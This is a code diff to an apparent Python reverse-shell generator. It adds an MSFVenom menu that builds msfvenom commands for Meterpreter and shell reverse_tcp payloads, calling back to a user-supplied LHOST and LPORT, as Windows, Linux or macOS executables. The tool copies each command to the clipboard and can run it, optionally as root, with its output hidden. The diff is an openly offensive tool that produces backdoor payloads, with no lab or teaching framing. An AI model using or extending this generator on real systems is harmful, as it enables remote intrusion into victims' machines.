@@ -2,11 +2,178 @@
 import pyperclip as clip
 import os
 
+
 def menu():
     print('''
     ________MENU_________
-    \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[9]. Exit
+    \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[4]. MSFVenom \n[9]. Exit
           ''')
+def venomMenu():
+    print('''
+    ______MSFVENOM_______
+    \n[1]. Meterpreter Staged x64 Rev. TCP \n[2]. Meterpreter Unstaged x64 Rev. TCP \n[3]. Stage Reverse TCP \n[9]. Exit
+          ''')
+
+def platformMenu():
+    print('''
+    ______PLATFORM_______
+    \n[1]. Windows \n[2]. Linux \n[3]. MacOS \n[9]. Exit
+          ''')
+
+
+def venomsubprocess():
+    selectShell = int(input("Select Shell: "))
+    if selectShell == 1:
+        lhost = input("LHOST= ")
+        lport = input("LPORT= ")
+        os.system("clear")
+        platformMenu()
+        platform = int(input("Select Platform: "))
+        while platform >= 4 and platform != 9:
+            os.system("clear")
+            platformMenu()
+            platform = int(input("Select Platform: "))
+        if platform == 1:
+            platform = "windows"
+            ext = "exe"
+        elif platform == 2:
+            platform = "linux"
+            ext = "elf"
+        elif platform == 3:
+            platform = "osx"
+            ext = "macho"
+        elif platform == 9:
+            os.system("clear")
+            venomMenu()
+            venomsubprocess()
+        name = input("Insert Name for exploit:")
+        shell = "msfvenom -p {0}/x64/meterpreter/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
+        print(shell)
+        clip.copy(shell)
+        print("Copied to clipboard")
+        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
+        while run >= 2 or run < 0:
+            run = int(input("Do you Want to Run it? (N or Y) : "))
+        if run == 0:
+            print("The command isn't going to execute\n its still in the clipboard!")
+            exit()
+        elif run == 1:
+            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
+            while root >= 2 or root < 0:
+                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
+            if root == 0:
+                print("\n Running... Please Wait")
+                os.system(shell + " >/dev/null 2>&1")
+                print("\nCommand has been executed **Without** Root priveleges!")
+                exit()
+            elif root == 1:
+                print("\n Running... Please Wait")
+                os.system("sudo " + shell + " >/dev/null 2>&1")
+                print("\nCommand has been executed **With** Root priveleges!")
+                exit()
+    if selectShell == 2:
+        lhost = input("LHOST= ")
+        lport = input("LPORT= ")
+        os.system("clear")
+        platformMenu()
+        platform = int(input("Select Platform: "))
+        while platform >= 4 and platform != 9:
+            os.system("clear")
+            platformMenu()
+            platform = int(input("Select Platform: "))
+        if platform == 1:
+            platform = "windows"
+            ext = "exe"
+        elif platform == 2:
+            platform = "linux"
+            ext = "elf"
+        elif platform == 3:
+            platform = "osx"
+            ext = "macho"
+        elif platform == 9:
+            os.system("clear")
+            venomMenu()
+            venomsubprocess()
+        name = input("Insert Name for exploit:")
+        shell = "msfvenom -p {0}/x64/meterpreter_reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
+        print(shell)
+        clip.copy(shell)
+        print("Copied to clipboard")
+        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
+        while run >= 2 or run < 0:
+            run = int(input("Do you Want to Run it? (N or Y) : "))
+        if run == 0:
+            print("The command isn't going to execute\n its still in the clipboard!")
+            exit()
+        elif run == 1:
+            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
+            while root >= 2 or root < 0:
+                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
+            if root == 0:
+                print("\n Running... Please Wait")
+                os.system(shell + " >/dev/null 2>&1")
+                print("\nCommand has been executed **Without** Root priveleges!")
+                exit()
+            elif root == 1:
+                print("\n Running... Please Wait")
+                os.system("sudo " + shell + " >/dev/null 2>&1")
+                print("\nCommand has been executed **With** Root priveleges!")
+                exit()
+    if selectShell == 3:
+        lhost = input("LHOST= ")
+        lport = input("LPORT= ")
+        os.system("clear")
+        platformMenu()
+        platform = int(input("Select Platform: "))
+        while platform >= 4 and platform != 9:
+            os.system("clear")
+            platformMenu()
+            platform = int(input("Select Platform: "))
+        if platform == 1:
+            platform = "windows"
+            ext = "exe"
+        elif platform == 2:
+            platform = "linux"
+            ext = "elf"
+        elif platform == 3:
+            platform = "osx"
+            ext = "macho"
+        elif platform == 9:
+            os.system("clear")
+            venomMenu()
+            venomsubprocess()
+        name = input("Insert Name for exploit:")
+        shell = "msfvenom -p {0}/x64/shell/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
+        print(shell)
+        clip.copy(shell)
+        print("Copied to clipboard")
+        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
+        while run >= 2 or run < 0:
+            run = int(input("Do you Want to Run it? (N or Y) : "))
+        if run == 0:
+            print("The command isn't going to execute\n its still in the clipboard!")
+            exit()
+        elif run == 1:
+            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
+            while root >= 2 or root < 0:
+                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
+            if root == 0:
+                print("\n Running... Please Wait")
+                os.system(shell + " >/dev/null 2>&1")
+                print("\nCommand has been executed **Without** Root priveleges!")
+                exit()
+            elif root == 1:
+                print("\n Running... Please Wait")
+                os.system("sudo " + shell + " >/dev/null 2>&1")
+                print("\nCommand has been executed **With** Root priveleges!")
+                exit()
+    if selectShell == 9:
+        os.system("clear")
+        main()
+    else:
+        os.system("clear")
+        venomMenu()
+        venomsubprocess()
 
 def pymenu():
     print('''
@@ -23,7 +190,7 @@ def pysubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -50,7 +217,7 @@ def pysubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -77,7 +244,7 @@ def pysubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType <0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -104,7 +271,7 @@ def pysubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -146,7 +313,7 @@ def bashsubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -173,7 +340,7 @@ def bashsubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -201,7 +368,7 @@ def bashsubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -228,7 +395,7 @@ def bashsubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
          os.system("clear")
          shellType = int(input(''' 
     _______Shell Type________
@@ -270,7 +437,7 @@ def ncsubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
             os.system("clear")
             shellType = int(input(''' 
     _______Shell Type________
@@ -298,7 +465,7 @@ def ncsubprocess():
         shellType = int(input(''' 
     _______Shell Type________
     \n[1]. SH \n[2]. BASH \n[3]. powershell\n[9]. Back to Shell Select\n \nSelect ShellType: '''))
-        while shellType >= 4 and shellType != 9:
+        while shellType >= 4 and shellType != 9 or shellType < 0:
             os.system("clear")
             shellType = int(input(''' 
     _______Shell Type________
@@ -342,6 +509,10 @@ def main():
         os.system("clear")
         ncmenu()
         ncsubprocess()
+    elif selectLib == 4:
+        os.system("clear")
+        venomMenu()
+        venomsubprocess()
 
     elif selectLib == 9:
         exit()
